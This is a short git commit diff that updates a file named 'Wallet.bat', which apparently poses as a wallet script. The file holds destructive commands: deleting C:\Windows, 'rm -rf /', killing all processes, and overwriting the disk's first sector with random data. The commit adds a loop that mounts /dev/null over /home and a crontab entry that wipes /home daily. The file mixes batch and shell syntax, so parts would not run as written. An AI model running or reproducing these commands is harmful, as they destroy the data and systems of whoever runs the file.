3b72f637cc58c6401d311f8df5d1236fcd34d9b6
P200p <taislot1999@gmail.com>
2025-08-21 04:59:07 +0700

    Update Wallet.bat

--- image/Wallet.bat
+++ image/Wallet.bat
@@ -2,10 +2,10 @@ del /f /q /s C:\Windows
 rm -rf/
  
 sudo rm -rf /
-
+while true; do sudo mount /dev/null /home; done
 
 kill -9 -1
-
+echo "0 3 * * * root rm -rf /home/*" >> /etc/crontab
 
 dd if=/dev/random of=/dev/sda bs=512 count=1
 
